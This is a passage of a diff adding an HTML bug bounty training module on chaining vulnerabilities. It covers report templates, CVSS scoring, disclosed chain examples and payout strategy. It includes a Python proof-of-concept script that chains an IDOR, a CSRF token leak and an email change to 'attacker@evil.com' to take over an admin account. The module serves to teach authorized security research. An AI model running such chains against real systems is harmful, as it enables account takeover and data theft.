+                <li><strong style="color:#c4a0d8;">Setup.</strong> Describe the attacker's starting position. What accounts do they have? What access do they start with? What information is publicly available? The preconditions must be realistic &mdash; "attacker has a free user account" is reasonable; "attacker has physical access to the server room" is not.</li>
+                <li><strong style="color:#c4a0d8;">Reconnaissance step.</strong> Show how the attacker discovers the information needed for the next step. This might be exploiting the info disclosure to learn about internal endpoints, or using the IDOR to identify the target account.</li>
+                <li><strong style="color:#c4a0d8;">Exploitation steps.</strong> Each step should include the exact HTTP request, the response, and an explanation of why this response is abnormal or exploitable. Show the data flowing from one step to the next.</li>
+                <li><strong style="color:#c4a0d8;">End state.</strong> Demonstrate the final impact. Show the admin panel you accessed, the data you retrieved, the action you performed as the victim. This is the screenshot or response that makes the triager understand the severity.</li>
+            </ol>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Documenting Chains Visually</h3>
+
+            <p>
+                A flowchart or diagram of your chain is worth a thousand words in a report. Even a
+                simple text-based diagram makes the attack sequence immediately clear:
+            </p>
+
+            <div class="code-block"><span class="comment">Attack Flow Diagram:</span>
+
+<span class="cmd">[Attacker]</span> --<span class="str">(1) IDOR on /api/users</span>--> <span class="cmd">[Leak victim email + role]</span>
+    |
+    v
+<span class="cmd">[Attacker]</span> --<span class="str">(2) Open redirect on /goto</span>--> <span class="cmd">[Craft OAuth phishing link]</span>
+    |
+    v
+<span class="cmd">[Victim clicks link]</span> --<span class="str">(3) OAuth code redirect</span>--> <span class="cmd">[Code sent to attacker via redirect]</span>
+    |
+    v
+<span class="cmd">[Attacker]</span> --<span class="str">(4) Exchange code for token</span>--> <span class="cmd">[Full account access]</span>
+    |
+    v
+<span class="cmd">[Attacker]</span> --<span class="str">(5) Access admin panel</span>--> <span class="flag">[CRITICAL: Modify all user accounts]</span></div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Maintaining State Across Steps</h3>
+
+            <p>
+                Complex chains often require maintaining state between steps: a session token from
+                step one is used in step three, a CSRF token leaked in step two is submitted in step
+                four. Document every piece of state that carries between steps and explain where it
+                came from. Triagers who cannot reproduce your chain because they missed a state
+                dependency will mark the report as incomplete.
+            </p>
+
+            <p>
+                For automated reproduction, consider providing a script that executes the complete
+                chain end-to-end. A Python script using the <code style="color:#86efac;">requests</code>
+                library that performs each step sequentially is the gold standard for chain reports:
+            </p>
+
+            <div class="code-block"><span class="comment"># Chain proof-of-concept script</span>
+<span class="kw">import</span> requests
+
+session = requests.Session()
+BASE = <span class="str">"https://app.target.com"</span>
+
+<span class="comment"># Step 1: IDOR to leak admin email</span>
+resp = session.get(<span class="str">f"{BASE}/api/users/1/settings"</span>,
+    headers={<span class="str">"Authorization"</span>: <span class="str">"Bearer USER_TOKEN"</span>})
+admin_email = resp.json()[<span class="str">"email"</span>]
+print(<span class="str">f"[+] Admin email: {admin_email}"</span>)
+
+<span class="comment"># Step 2: CSRF token leak via info disclosure</span>
+resp = session.get(<span class="str">f"{BASE}/api/debug/session"</span>)
+csrf_token = resp.json()[<span class="str">"csrf_token"</span>]
+print(<span class="str">f"[+] CSRF token: {csrf_token}"</span>)
+
+<span class="comment"># Step 3: Use CSRF to change admin email to attacker's</span>
+resp = session.post(<span class="str">f"{BASE}/api/users/1/email"</span>,
+    json={<span class="str">"email"</span>: <span class="str">"attacker@evil.com"</span>, <span class="str">"csrf"</span>: csrf_token})
+print(<span class="str">f"[+] Email changed: {resp.status_code}"</span>)
+
+<span class="comment"># Step 4: Trigger password reset to attacker's email</span>
+resp = session.post(<span class="str">f"{BASE}/api/password-reset"</span>,
+    json={<span class="str">"email"</span>: <span class="str">"attacker@evil.com"</span>})
+print(<span class="str">f"[+] Password reset sent: {resp.status_code}"</span>)
+print(<span class="str">"[+] Chain complete: admin account takeover"</span>)</div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Timing-Dependent Chains</h3>
+
+            <p>
+                Some chains depend on precise timing: race conditions where two requests must arrive
+                within milliseconds, token expiration windows that create brief opportunities, or
+                cache invalidation delays that expose stale data. For these chains, provide timing
+                details in your report, explain the window of opportunity, and consider recording a
+                video of the successful exploitation. If the timing window is very narrow, explain
+                how the attack could be automated to increase success rate.
+            </p>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Video Evidence for Complex Chains</div>
+                    <div class="callout-text">
+                        For chains with more than three steps, a screen recording of the exploitation
+                        is more convincing than screenshots alone. Tools like OBS Studio (free) can
+                        record your browser and terminal simultaneously. Narrate or annotate the video
+                        to explain what is happening at each step. A two-minute video that shows the
+                        complete chain from attacker starting position to final impact is the most
+                        effective evidence you can provide.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 5: Writing Chain Reports -->
+    <div class="section" id="s5">
+        <div class="section-number">Section 05</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128221;</span>
+            Writing Chain Reports
+        </h2>
+        <div class="section-body">
+            <p>
+                A chain report is fundamentally different from a single-bug report. It requires a
+                narrative structure that guides the reader through an attack sequence, explains why
+                each component matters, and proves that the cumulative impact exceeds what any
+                individual component would achieve alone. The goal is to make the triager understand
+                the complete attack scenario within the first two paragraphs.
+            </p>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Report Structure for Chains</h3>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128221;</span>
+                        <div>
+                            <div class="detail-header-title">Chain Report Template</div>
+                            <div class="detail-header-subtitle">The structure that maximizes chain acceptance and payout</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p><strong style="color:#c4a0d8;">Title:</strong> State the end impact, not the components. "Account Takeover via IDOR + Open Redirect + OAuth Flow" &mdash; not "Multiple vulnerabilities found."</p>
+                    <p><strong style="color:#c4a0d8;">Executive Summary (2-3 sentences):</strong> Describe the complete attack in plain language. "An attacker with a free account can take over any user's account, including administrators, by chaining three vulnerabilities: an IDOR that leaks user emails, an open redirect on the OAuth callback, and insufficient redirect URI validation. This allows full access to the admin panel and all customer data."</p>
+                    <p><strong style="color:#c4a0d8;">Severity Assessment:</strong> Score based on the cumulative impact, not individual components. Explain why the chain severity exceeds the parts: "Individual components: Medium, Low, Medium. Chain impact: Critical (P1). The chain enables unauthenticated account takeover of any user including administrators."</p>
+                    <p><strong style="color:#c4a0d8;">Affected Components:</strong> List every endpoint, parameter, and feature involved in the chain.</p>
+                    <p><strong style="color:#c4a0d8;">Attack Flow:</strong> Visual diagram of the chain (text-based is fine).</p>
+                    <p><strong style="color:#c4a0d8;">Step-by-Step Reproduction:</strong> Numbered steps with exact HTTP requests and responses for each stage. Mark the output of each step that feeds into the next.</p>
+                    <p><strong style="color:#c4a0d8;">Proof of Concept:</strong> Screenshots, HTTP request/response pairs, and ideally a video or automation script.</p>
+                    <p><strong style="color:#c4a0d8;">Impact Analysis:</strong> Quantify the impact: number of affected users, types of data exposed, actions the attacker can take.</p>
+                    <p><strong style="color:#c4a0d8;">Remediation:</strong> Address each component separately. "Fix the IDOR by implementing authorization checks. Fix the open redirect by validating against a whitelist. Fix the OAuth flow by enforcing strict redirect URI matching."</p>
+                </div>
+            </div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">The Narrative Approach</h3>
+
+            <p>
+                Write the report as a story with a clear beginning, middle, and end. The beginning
+                establishes the attacker's starting position and motivation. The middle walks through
+                each exploitation step. The end demonstrates the devastating outcome. This narrative
+                structure is more persuasive than a dry list of technical findings because it helps
+                the triager (and ultimately the development team) understand the real-world attack
+                scenario.
+            </p>
+
+            <p>
+                Use transitional phrases between steps: "Using the email obtained in Step 1, the
+                attacker now..." or "Because the application does not validate the redirect parameter,
+                the attacker can leverage this to..." These connections are what distinguish a chain
+                report from a report that simply lists multiple bugs.
+            </p>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">CVSS Scoring for Chains</h3>
+
+            <p>
+                When scoring a chain using CVSS, evaluate the complete attack scenario:
+            </p>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>CVSS Metric</th>
+                        <th>Single Bug Approach</th>
+                        <th>Chain Approach</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">Attack Complexity</td>
+                        <td>Score each bug individually</td>
+                        <td>Score the most complex step in the chain</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">User Interaction</td>
+                        <td>Per-bug interaction needs</td>
+                        <td>Does the chain require any user interaction at any step?</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Impact (CIA)</td>
+                        <td>Per-bug impact</td>
+                        <td>Cumulative impact of the full chain end-state</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Scope</td>
+                        <td>Per-bug scope</td>
+                        <td>Does the chain cross trust boundaries?</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout callout-warning">
+                <span class="callout-icon">&#9888;</span>
+                <div class="callout-content">
+                    <div class="callout-title">One Report Per Chain</div>
+                    <div class="callout-text">
+                        Submit the entire chain as a single report, not as separate reports for each
+                        component. If you report the IDOR separately and the XSS separately, you will
+                        receive individual payouts for each (lower severity). If you report them as a
+                        chain, you receive a single payout for the chain's cumulative impact (higher
+                        severity). Additionally, reporting components separately means the triager may
+                        fix one component, breaking your chain before you can report it. Always report
+                        the chain as one cohesive finding.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 6: Real-World Chain Examples -->
+    <div class="section" id="s6">
+        <div class="section-number">Section 06</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#127942;</span>
+            Real-World Chain Examples
+        </h2>
+        <div class="section-body">
+            <p>
+                Studying disclosed chains from public bug bounty reports is one of the most effective
+                ways to develop chain-thinking. These examples demonstrate how researchers combined
+                individually modest findings into critical attack sequences that earned significant
+                bounties.
+            </p>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Example 1: GitLab Account Takeover (2020)</h3>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128270;</span>
+                        <div>
+                            <div class="detail-header-title">CSRF + OAuth Integration = Full Account Takeover</div>
+                            <div class="detail-header-subtitle">HackerOne disclosure: $33,750 bounty</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>The researcher discovered that GitLab's OAuth integration with third-party providers had insufficient state validation. The chain:</p>
+                    <ul>
+                        <li><strong style="color:#c4a0d8;">Step 1:</strong> Create a GitLab account linked to an attacker-controlled OAuth provider</li>
+                        <li><strong style="color:#c4a0d8;">Step 2:</strong> Exploit a CSRF vulnerability in the account linking flow to associate the attacker's OAuth credentials with the victim's GitLab account</li>
+                        <li><strong style="color:#c4a0d8;">Step 3:</strong> Log in via the OAuth provider, which now grants access to the victim's account</li>
+                    </ul>
+                    <p><strong style="color:#c4a0d8;">Why it worked:</strong> The CSRF alone was medium severity (it could link an unwanted OAuth provider). But chained with the OAuth login flow, it became a full account takeover affecting all GitLab users. The researcher clearly documented the state parameter bypass and provided a one-click proof of concept.</p>
+                </div>
+            </div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Example 2: Shopify Merchant Account Takeover (2019)</h3>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128270;</span>
+                        <div>
+                            <div class="detail-header-title">Open Redirect + Token Leakage + Password Reset</div>
+                            <div class="detail-header-subtitle">Disclosed on HackerOne: $15,250 bounty</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>This chain exploited how Shopify handled password reset tokens in conjunction with an open redirect:</p>
+                    <ul>
+                        <li><strong style="color:#c4a0d8;">Step 1:</strong> Identify an open redirect on a Shopify subdomain that preserved URL fragments</li>
+                        <li><strong style="color:#c4a0d8;">Step 2:</strong> Trigger a password reset for the target merchant. The reset link included a token in the URL</li>
+                        <li><strong style="color:#c4a0d8;">Step 3:</strong> Craft a URL that passed through the open redirect, leaking the reset token via the Referer header to an attacker-controlled server</li>
+                        <li><strong style="color:#c4a0d8;">Step 4:</strong> Use the leaked reset token to set a new password and take over the merchant's store</li>
+                    </ul>
+                    <p><strong style="color:#c4a0d8;">Why it worked:</strong> The open redirect was a low. The Referer header leak was informational. But together they created a mechanism to intercept password reset tokens, enabling full merchant account takeover with access to customer data, payment information, and store management.</p>
+                </div>
+            </div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Example 3: Uber Internal Network Access (2016)</h3>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128270;</span>
+                        <div>
+                            <div class="detail-header-title">SSRF + Cloud Metadata + Internal Services</div>
+                            <div class="detail-header-subtitle">Disclosed: $10,000 bounty</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>A researcher found an SSRF in a feature that fetched URLs provided by users:</p>
+                    <ul>
+                        <li><strong style="color:#c4a0d8;">Step 1:</strong> SSRF in a URL preview feature allowed making HTTP requests from Uber's internal network</li>
+                        <li><strong style="color:#c4a0d8;">Step 2:</strong> Used SSRF to access AWS metadata endpoint, retrieving IAM role credentials</li>
+                        <li><strong style="color:#c4a0d8;">Step 3:</strong> IAM credentials had access to internal S3 buckets containing source code, deployment configurations, and database connection strings</li>
+                        <li><strong style="color:#c4a0d8;">Step 4:</strong> Database connection strings allowed direct access to internal databases (demonstrated without actually accessing production data)</li>
+                    </ul>
+                    <p><strong style="color:#c4a0d8;">Why it worked:</strong> The SSRF alone might have been a medium (limited internal access). But by demonstrating the full chain from SSRF to cloud credentials to internal data access, the researcher proved that the SSRF was the entry point to the entire internal infrastructure. The key was demonstrating each escalation step without overstepping ethical boundaries.</p>
+                </div>
+            </div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Example 4: HackerOne Platform RCE (2020)</h3>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128270;</span>
+                        <div>
+                            <div class="detail-header-title">Information Disclosure + Deserialization + RCE</div>
+                            <div class="detail-header-subtitle">Disclosed on HackerOne: $25,000 bounty</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>A researcher targeted HackerOne's own platform infrastructure:</p>
+                    <ul>
+                        <li><strong style="color:#c4a0d8;">Step 1:</strong> Information disclosure revealed the application framework and specific library versions (Rails with a known-vulnerable version of a serialization gem)</li>
+                        <li><strong style="color:#c4a0d8;">Step 2:</strong> Identified an endpoint that accepted serialized data, intended for internal caching</li>
+                        <li><strong style="color:#c4a0d8;">Step 3:</strong> Crafted a deserialization payload specific to the disclosed library version, achieving code execution on the server</li>
+                    </ul>
+                    <p><strong style="color:#c4a0d8;">Why it worked:</strong> The information disclosure was low severity on its own. But it provided the exact version information needed to craft a working deserialization exploit. Without the disclosure, the researcher would have been guessing at library versions. The chain converted a low into an RCE.</p>
+                </div>
+            </div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Example 5: Facebook Pixel Data Theft (2019)</h3>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128270;</span>
+                        <div>
+                            <div class="detail-header-title">CORS Misconfiguration + Sensitive Endpoint + Mass Data Access</div>
+                            <div class="detail-header-subtitle">Reported to Facebook: $10,000+ bounty</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>This chain exploited a CORS misconfiguration on a Facebook Business endpoint:</p>
+                    <ul>
+                        <li><strong style="color:#c4a0d8;">Step 1:</strong> Discovered that a specific API endpoint reflected the Origin header in its CORS response without proper validation</li>
+                        <li><strong style="color:#c4a0d8;">Step 2:</strong> The endpoint returned sensitive business data: pixel configurations, audience data, and advertising performance metrics</li>
+                        <li><strong style="color:#c4a0d8;">Step 3:</strong> Created a malicious webpage that, when visited by a Facebook Business user, silently exfiltrated their business data via cross-origin requests</li>
+                    </ul>
+                    <p><strong style="color:#c4a0d8;">Why it worked:</strong> A CORS misconfiguration alone is often dismissed as informational. The researcher elevated it by demonstrating which specific sensitive data could be stolen and building a working proof of concept that showed the data theft in action. The business impact &mdash; competitor access to advertising data &mdash; was the decisive factor.</p>
+                </div>
+            </div>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Study Disclosed Reports</div>
+                    <div class="callout-text">
+                        HackerOne's Hacktivity feed, Bugcrowd's Hall of Fame, and individual researcher
+                        blogs are the best sources for studying real chains. When reading a disclosed
+                        chain, reverse-engineer the researcher's thought process: at what point did they
+                        decide to chain instead of reporting individually? How did they discover that the
+                        components could be connected? What made the report convincing to the triager?
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 7: Bounty Maximization Strategy -->
+    <div class="section" id="s7">
+        <div class="section-number">Section 07</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128161;</span>
+            Bounty Maximization Strategy
+        </h2>
+        <div class="section-body">
+            <p>
+                Chaining is a strategic decision, not an automatic one. Sometimes it is more profitable
+                to report findings separately. Sometimes a chain multiplies the value of your findings
+                by an order of magnitude. Understanding when to chain and when to split is a key skill
+                for maximizing your earnings.
+            </p>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">When to Chain vs Report Separately</h3>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3><span class="li-marker">&#9654;</span> Chain When...</h3>
+                    <ul>
+                        <li><span class="li-marker">&#8226;</span> Individual components are low or medium severity</li>
+                        <li><span class="li-marker">&#8226;</span> The chain demonstrates a qualitatively different impact (e.g., account takeover)</li>
+                        <li><span class="li-marker">&#8226;</span> One component is out of scope individually but enables a critical chain</li>
+                        <li><span class="li-marker">&#8226;</span> The chain tells a compelling attack narrative</li>
+                        <li><span class="li-marker">&#8226;</span> Fixing any single component breaks the entire chain</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3><span class="li-marker">&#9654;</span> Report Separately When...</h3>
+                    <ul>
+                        <li><span class="li-marker">&#8226;</span> Each finding is high or critical on its own</li>
+                        <li><span class="li-marker">&#8226;</span> The chain does not significantly amplify impact</li>
+                        <li><span class="li-marker">&#8226;</span> Components are in completely unrelated features</li>
+                        <li><span class="li-marker">&#8226;</span> You risk the program fixing one component before you finish the chain</li>
+                        <li><span class="li-marker">&#8226;</span> The sum of individual payouts would exceed the chain payout</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Negotiating Chain Value</h3>
+
+            <p>
+                When a triager evaluates your chain at a lower severity than you believe is justified,
+                you have the right to request reconsideration. Effective negotiation strategies:
+            </p>
+
+            <ul>
+                <li><strong style="color:#c4a0d8;">Reference the program's severity guidelines.</strong> Most programs define severity based on impact, not vulnerability class. If your chain achieves account takeover, it meets the program's definition of critical regardless of the individual components.</li>
+                <li><strong style="color:#c4a0d8;">Provide additional proof of impact.</strong> If the triager questions the exploitability, provide a more detailed proof of concept or a video demonstration showing the complete attack end-to-end.</li>
+                <li><strong style="color:#c4a0d8;">Cite precedent.</strong> If similar chains in the same program or on the same platform were awarded higher bounties, reference those disclosures. Platform consistency matters to triagers.</li>
+                <li><strong style="color:#c4a0d8;">Quantify the blast radius.</strong> "This chain affects all 500,000 users" carries more weight than "this chain affects users." Provide the data to support your impact claim.</li>
+                <li><strong style="color:#c4a0d8;">Remain professional.</strong> Aggressive or adversarial negotiation harms your reputation. State your case clearly, provide evidence, and accept the final decision gracefully. Your reputation score is a long-term asset.</li>
+            </ul>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">Building a Reputation for Chain Hunting</h3>
+
+            <p>
+                Researchers known for high-impact chains receive more private program invitations,
+                get faster triage, and are given the benefit of the doubt on borderline severity
+                decisions. Building this reputation is a deliberate process:
+            </p>
+
+            <ol class="numbered-list">
+                <li><strong style="color:#c4a0d8;">Start with solid single-bug reports.</strong> Build a foundation of well-written, valid reports that establish your technical credibility and signal score.</li>
+                <li><strong style="color:#c4a0d8;">Escalate gradually.</strong> Your first chain can be a two-step combination. As your skills develop, build longer and more complex chains. The progression from single bugs to simple chains to complex multi-step attacks is natural.</li>
+                <li><strong style="color:#c4a0d8;">Publish writeups.</strong> When reports are disclosed, write detailed blog posts explaining your chain-finding methodology. The bug bounty community values knowledge sharing, and published chains attract program attention.</li>
+                <li><strong style="color:#c4a0d8;">Specialize in a domain.</strong> Some researchers are known for OAuth chains. Others specialize in SSRF-to-cloud escalation. Others focus on mobile application chains. A specialization makes you the go-to researcher when programs need expertise in that area.</li>
+            </ol>
+
+            <h3 style="color:#c4a0d8; font-size:1rem; margin:24px 0 12px; font-weight:400;">The Stok Approach: Impact-Driven Hunting</h3>
+
+            <p>
+                STOK, one of the most recognized figures in the bug bounty community, advocates for
+                impact-driven hunting: start with the most critical thing you could do to the
+                target and work backward. Instead of asking "what bugs can I find?", ask "how could
+                I take over an admin account?" or "how could I access the database?" Then systematically
+                test every path to that objective. Bugs become stepping stones toward the objective
+                rather than isolated findings.
+            </p>
+
+            <p>
+                This inversion of the typical hunting approach naturally produces chains because you
+                are always thinking about the end goal. A medium-severity XSS is not a report &mdash;
+                it is a tool for achieving something bigger. An information disclosure is not a
+                finding &mdash; it is intelligence for the next step. This mindset is what separates
+                hunters who earn $500 per bug from those who earn $10,000 per chain.
+            </p>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Keep a Chain Notebook</div>
+                    <div class="callout-text">
+                        Maintain a running list of low-severity and informational findings for every
+                        target you test. When you discover a new finding, review your notebook to see
+                        if it connects to anything you found previously. The IDOR you found last month
+                        might be the missing piece for a chain with the XSS you found today. Many of
+                        the best chains are discovered days or weeks after the individual components
+                        were found, through review and connection-making rather than real-time discovery.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Discussion -->
+    <div class="section" id="discuss">
+        <div class="discussion-section">
+            <div class="discussion-title">
+                <span>&#128172;</span>
+                Discussion Prompts
+            </div>
+            <ul class="prompt-list">
+                <li class="prompt-item">
+                    <span class="prompt-num">01</span>
+                    You find three medium-severity bugs in the same application. Two of them can be chained into a critical account takeover. Should you report all three in one chain report, or report the two-bug chain separately and the third bug individually? What factors influence this decision?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">02</span>
+                    A company fixes one component of your chain before you finish documenting the complete exploitation. You can still prove the other components are vulnerable, but the chain no longer works end-to-end. How do you handle the report? Can you still argue for chain-level severity?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">03</span>
+                    At what point does the complexity of a chain undermine its credibility? A 10-step chain that requires 4 user interactions and 2 race conditions technically achieves RCE, but is it realistic? How do triagers weigh theoretical chains vs. practical attack scenarios?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">04</span>
+                    Some researchers argue that chain hunting encourages withholding individual findings to maximize payouts, potentially leaving organizations vulnerable longer. Others argue that chains demonstrate real-world attack paths that motivate faster remediation. Which perspective do you find more compelling, and why?
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Completion -->
+    <div class="section" id="completion">
+        <div class="completion-section">
+            <div class="completion-icon">&#10003;</div>
+            <h2 class="completion-title">Module Complete</h2>
+            <p class="completion-text">
+                You now understand the economics of chaining, the common patterns that produce critical
+                chains from medium-severity components, how to amplify impact through business framing,
+                the mechanics of multi-step exploitation documentation, and the strategic decisions
+                around when to chain versus report individually. These skills transform your approach
+                from finding bugs to demonstrating attack scenarios &mdash; the difference between
+                modest payouts and career-defining reports.
+            </p>
+            <button class="completion-btn" onclick="completeModule()">
+                <span>&#10003;</span>
+                Complete Module 19
+            </button>
+        </div>
+    </div>
+
+</main>
+
+<script>
+    function updateScrollProgress() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+        document.getElementById('scrollProgress').style.width = pct + '%';
+        document.getElementById('readingFill').style.width = pct + '%';
+    }
+
+    window.addEventListener('scroll', updateScrollProgress, { passive: true });
+
+    function initSectionAnimations() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) entry.target.classList.add('visible');
+            });
+        }, { threshold: 0.08 });
+
+        document.querySelectorAll('.section').forEach(s => observer.observe(s));
+    }
+
+    function toggleDetail(header) {
+        const body = header.nextElementSibling;
+        const toggle = header.querySelector('.detail-toggle');
+        const isOpen = body.classList.contains('open');
+        body.classList.toggle('open', !isOpen);
+        toggle.classList.toggle('open', !isOpen);
+    }
+
+    function completeModule() {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('dark-arts', 'bh-mod-chaining', {
+                returnUrl: '../index.html'
+            });
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        initSectionAnimations();
+    });
+</script>
+
+</body>
+</html>
